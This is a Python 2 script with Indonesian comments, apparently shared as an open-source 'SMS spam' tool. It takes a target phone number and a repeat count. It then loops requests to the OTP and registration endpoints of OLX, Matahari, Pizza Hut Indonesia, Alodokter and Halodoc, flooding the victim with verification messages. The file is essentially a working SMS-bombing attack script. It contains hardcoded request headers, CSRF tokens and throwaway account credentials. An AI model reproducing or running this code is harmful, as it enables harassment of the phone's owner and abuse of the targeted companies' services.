#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
# Open source
# Subscribe Xenzi Ganz
# Mau Upload Izin Dulu Ya -_-_-_-


# Code By Xenzi Ganz
# Di buat : 06/03/2022
# Verison 3.0

# Team
# Xenzi Ganz
# Jeeck X Nano# Dumai991
# Polygon
# Panglima Jateng

# Note : Kalo Mau upload Izin Dulu
# Syarat Upload :
#                1. Taro link yt saya di deskripsi mu
#                2. Tidak Boleh Menghapus Nama Author
#                3. Boleh kamu Kasih nama mu di script
#                4. Tidak Boleh Di Jual -_-


# Merek HP   : Vivo y12
# Bahasa Program : Python 2.7
# Janggan Lupa Subscribe | Xenzi Ganz >_<
G = '\033[0;32m'
C = '\033[0;36m'
W = '\033[0;37m'
R = '\033[0;31m'
import os,sys,time,re,requests,json
reload(sys)
sys.setdefaultencoding('utf8')
def sms(nomor):
	r=requests.Session()
	xen={
'Host': 'www.olx.co.id',
'content-length': '62',
'x-newrelic-id': 'VQMGU1ZVDxABU1lbBgMDUlI=',
'sec-ch-ua-mobile': '?1',
'x-panamera-fingerprint': '2648ea7246809e919e8f757058f4a856#1642317690651',
'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
'content-type': 'application/json',
'accept': '*/*',
'save-data': 'on',
'origin': 'https://www.olx.co.id',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.olx.co.id/account',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
	}
	xen1=json.dumps({
"grantType": "phone",
"phone": "+62"+nomor,
"language": "id"
	})
	req = r.post('https://www.olx.co.id/api/auth/authenticate',headers=xen,data=xen1).text
	if 'PENDING' in req:
		print '   \033[0;37m[\033[0;32m✓\033[0;37m] \033[0;37mSuccess spam \033[0;32m%s'%(nomor)
	else:
		print '   \033[0;37m[\033[0;31m!\033[0;37m] Failed Spam %s '%(nomor)
	xen2={
#'Host': 'www.matahari.com',
#'content-length': '234',
#'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
#'sec-ch-ua-mobile': '?1',
#'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
#'content-type': 'application/json',
#'accept': '*/*',
#'x-requested-with': 'XMLHttpRequest',
#'save-data': 'on',
#'origin': 'https://www.matahari.com',
#'sec-fetch-site': 'same-origin',
#'sec-fetch-mode': 'cors',
#'sec-fetch-dest': 'empty',
#'referer': 'https://www.matahari.com/customer/account/create/',
#'accept-encoding': 'gzip, deflate, br',
#'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
		}
	xen3=json.dumps({
"thor_customer": {
    "name": " Wokwowkowkwk",
    "email_address": "aldigg970@gmail.com",
    "mobile_country_code": "+62",
    "gender_id": "1",
    "mobile_number": "0"+nomor,
    "mro": "",
    "password": "Aldiw+)1973",
    "birth_date": "06/03/2022"
}
	})
	req1 = r.post('https://www.matahari.com/rest/V1/thorCustomers', headers=xen2,data=xen3).text
#	if 'Success' in req1:
#		print '   \033[0;37m[\033[0;32m✓\033[0;37m] \033[0;37mSuccess spam \033[0;32m%s'%(nomor)
#	else:
#		print '   \033[0;37m[\033[0;31m!\033[0;37m] Failed Spam %s '%(nomor)
	xen4={
'Host': 'api-prod.pizzahut.co.id',
'content-length': '157',
'x-device-type': 'PC',
'sec-ch-ua-mobile': '?1',
'x-platform': 'WEBMOBILE',
'x-channel': '2',
'content-type': 'application/json;charset=UTF-8',
'accept': 'application/json',
'x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab',
'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
'x-lang': 'en',
'save-data': 'on',
'x-device-id': 'web',
'origin': 'https://www.pizzahut.co.id',
'sec-fetch-site': 'same-site',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.pizzahut.co.id/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
	}
	xen5=json.dumps({
  "email": "aldigg088@gmail.com",
  "first_name": "Xenzi",
  "last_name": "Wokwokw",
  "password": "Aldi++\\/67",
  "phone": "0"+nomor,
  "birthday": "2000-01-02"
	})
	req2 = r.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers=xen4,data=xen5).text
	if 'Successful' in req2:
        	print '   \033[0;37m[\033[0;32m✓\033[0;37m] \033[0;37mSuccess spam \033[0;32m%s'%(nomor)
	else:
		print '   \033[0;37m[\033[0;31m!\033[0;37m] Failed Spam %s '%(nomor)
	xen6={
'Host': 'www.alodokter.com',
'content-length': '33',
'x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==',
'sec-ch-ua-mobile': '?1',
'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
'content-type': 'application/json',
'accept': 'application/json',
'save-data': 'on',
'origin': 'https://www.alodokter.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.alodokter.com/login-alodokter',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
	}
	xen7=json.dumps({
"user": {
    "phone": "0"+nomor
  }
	})
	req3 = r.post('https://www.alodokter.com/login-with-phone-number', headers=xen6,data=xen7).text
        if 'success' in req3:
                print '   \033[0;37m[\033[0;32m✓\033[0;37m] \033[0;37mSuccess spam \033[0;32m%s'%(nomor)
        else:
                print '   \033[0;37m[\033[0;31m!\033[0;37m] Failed Spam %s '%(nomor)
	xen8={
#'Host': 'www.halodoc.com',
#'x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89',
#'sec-ch-ua-mobile': '?1',
#'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
#'content-type': 'application/json',
#'accept': 'application/json, text/plain, */*',
#'save-data': 'on',
#'origin': 'https://www.halodoc.com',
#'sec-fetch-site': 'same-origin',
#'sec-fetch-mode': 'cors',
#'sec-fetch-dest': 'empty',
#'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
	}
	xen9=json.dumps({
"phone_number": "+62"+nomor,
"channel": "sms"
	})
	req4 = r.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers=xen8,data=xen9).text
    #    if 'success' in req4:
   #             print '   \033[0;37m[\033[0;32m✓\033[0;37m] \033[0;37mSuccess spam \033[0;32m%s'%(nomor)
  #      else:
 #               print '   \033[0;37m[\033[0;31m!\033[0;37m] Failed Spam %s '%(nomor)
#	print '   \033[0;37m[\033[0;31m#\033[0;37m] \033[0;37mSelesai'
def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print '''

\033[0;36m	  ________  ___      ___   ________  
\033[0;36m	 /"       )|"  \    /"  | /"       ) \033[0;35m® \033[0;37mFuck You Linux
\033[0;36m	(:   \___/  \   \  //   |(:   \___/  
	 \___  \    /\\  \/.    | \___  \     
	  __/  \\  |: \.        |  __/  \\   
	 /" \   :) |.  \    /:  | /" \   :)  
\033[0;36m	(_______/  |___|\__/|___|(_______/  \033[0;35m© \033[0;32mV.1
           \033[1;32m
'''
	for jum in range(int(sys.argv[2])):
		sms(sys.argv[1])
		time.sleep(5)
if __name__=='__main__':
	try:
		main()
	except IndexError:
		exit('   \033[0;37m[\033[0;31m!\033[0;37m] Example \033[0;31m: \033[0;37mpython2 %s \033[0;32m<nomor> <jumlahspam>'%(sys.argv[0]))
	except requests.exceptions.ConnectionError:
		exit('\033[0;37m[\033[0;31m!\033[0;37m] \033[0;37mKoneksi Internet Error')
